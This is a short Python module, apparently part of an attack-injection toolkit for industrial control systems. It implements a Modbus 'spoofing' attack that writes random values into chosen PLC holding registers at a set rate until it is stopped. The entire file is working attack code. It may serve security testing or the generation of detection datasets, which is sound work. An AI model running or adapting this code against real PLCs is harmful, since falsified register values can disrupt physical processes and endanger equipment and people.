# injector/attacks/mass_overwrite.py

import logging
import random
import time
from typing import Sequence

from injector.core.config import PlcConfig
from injector.core.modbus import write_holding_register

log = logging.getLogger(__name__)


def run_spoofing(
    *,
    cfg: PlcConfig,
    stop_event,
    target_registers: Sequence[int],
    qps: float = 20.0,
    min_value: int = 0,
    max_value: int = 1000,
) -> None:
    """
    Atak SPOOFING:
    - losowo wybiera rejestr z target_registers,
    - zapisuje losową wartość z [min_value, max_value],
    - robi to w przybliżeniu qps razy na sekundę.
    """

    if not target_registers:
        log.warning("Spoofing: empty target_registers, nothing to do.")
        return

    period = 1.0 / qps if qps > 0 else 0.0

    log.info(
        "Starting SPOOFING: targets=%s, qps=%.1f, value_range=[%d, %d]",
        list(target_registers),
        qps,
        min_value,
        max_value,
    )

    try:
        while not stop_event.is_set():
            addr = random.choice(list(target_registers))
            val = random.randint(min_value, max_value)

            try:
                write_holding_register(addr, val, cfg=cfg)
                log.info("Spoofing wrote HR[%d] = %d", addr, val)
            except Exception as e:
                log.warning(
                    "Spoofing exception on write HR[%d]=%d: %r", addr, val, e
                )

            if period > 0:
                time.sleep(period)
    finally:
        log.info("Spoofing: stop_event set, leaving loop.")
